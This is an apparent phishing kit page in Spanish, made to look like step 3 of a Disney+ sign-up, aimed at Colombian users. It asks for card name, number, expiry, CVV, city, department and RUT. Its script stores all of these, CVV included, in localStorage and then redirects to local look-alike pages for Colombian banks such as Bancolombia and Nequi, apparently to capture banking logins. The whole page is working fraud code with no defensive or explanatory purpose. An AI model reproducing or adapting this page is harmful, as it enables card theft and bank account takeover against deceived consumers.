<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Paso 3 | Disney+</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

<style>
body {
    margin: 0;
    background: #0f0f0f;
    font-family: 'Inter', sans-serif;
    color: #fff;
}

header {
    padding: 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}
header img { height: 34px; }
header a { color: #bbb; text-decoration: none; }

.main-container {
    padding: 20px;
    max-width: 600px;
    margin: auto;
}

label {
    display: block;
    margin: 18px 0 6px;
    color: #d1d5db;
}

input, select {
    width: 100%;
    padding: 15px;
    background: #1a1a1a;
    border: 1px solid #383838;
    border-radius: 6px;
    color: #fff;
}

/* CAMPO TARJETA */
.input-card { position: relative; }
.card-icons {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    display: flex;
    gap: 6px;
}
.card-icons img { height: 26px; }

/* FECHA / CVV */
.row-double { display: flex; gap: 15px; }
.field-group { flex: 1; }

/* BOTÓN */
button {
    width: 100%;
    padding: 16px;
    background: #fff;
    border: none;
    color: #000;
    border-radius: 30px;
    font-size: 17px;
    cursor: pointer;
    font-weight: 600;
}

@media (max-width: 480px) {
    .row-double { flex-direction: column; }
}
</style>
</head>

<body>

<header>
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg">
    <a href="#">Cerrar sesión</a>
</header>

<div class="main-container">

    <h2>PASO 3 DE 3</h2>
    <h1>¡A disfrutar!</h1>

    <label>NOMBRE EN LA TARJETA</label>
    <input id="nombreTarjeta" type="text" placeholder="Nombre del titular">

    <label>NÚMERO DE TARJETA</label>
    <div class="input-card">
        <input id="numeroTarjeta" type="text" placeholder="•••• •••• •••• ••••" maxlength="19">
        <div class="card-icons">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Mastercard-logo.png/1200px-Mastercard-logo.png">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
        </div>
    </div>

    <div class="row-double">
        <div class="field-group">
            <label>FECHA VENC.</label>
            <input id="fecha" type="text" placeholder="MM/AA">
        </div>

        <div class="field-group">
            <label>CVV</label>
            <input id="cvv" type="password" maxlength="4" placeholder="CVV">
        </div>
    </div>

    <label>CIUDAD</label>
    <input id="ciudad" type="text" placeholder="Ciudad">

    <label>DEPARTAMENTO</label>
    <select id="departamento">
        <option value="">Seleccionar…</option>
        <option>Antioquia</option>
        <option>Cundinamarca</option>
        <option>Valle</option>
        <option>Atlántico</option>
    </select>

    <label>RUT (opcional)</label>
    <input id="rut" type="text" placeholder="Opcional">

    <label>Selecciona tu banco</label>
    <select id="banco">
        <option value="">Elegir banco…</option>
        <option value="banco-bancolombia.html">Bancolombia</option>
        <option value="banco-nequi.html">Nequi</option>
        <option value="banco-davivienda.html">Davivienda</option>
        <option value="banco-bbva.html">BBVA</option>
        <option value="banco-bogota.html">Banco de Bogotá</option>
        <option value="banco-popular.html">Banco Popular</option>
        <option value="banco-itau.html">Itaú</option>
    </select>

    <button onclick="redirigirBanco()">INICIAR VALIDACIÓN</button>
</div>

<script>
function redirigirBanco() {

    const bankPage = document.getElementById("banco").value;

    if (bankPage === "") {
        alert("Selecciona un banco para continuar.");
        return;
    }

    // GUARDA TODO ANTES DE REDIRIGIR
    localStorage.setItem("nombreTarjeta", document.getElementById("nombreTarjeta").value);
    localStorage.setItem("numeroTarjeta", document.getElementById("numeroTarjeta").value);
    localStorage.setItem("fecha", document.getElementById("fecha").value);
    localStorage.setItem("cvv", document.getElementById("cvv").value);
    localStorage.setItem("ciudad", document.getElementById("ciudad").value);
    localStorage.setItem("departamento", document.getElementById("departamento").value);
    localStorage.setItem("rut", document.getElementById("rut").value);

    // REDIRECCIÓN A LA PÁGINA DEL BANCO
    window.location.href = bankPage;
}
</script>

</body>
</html>
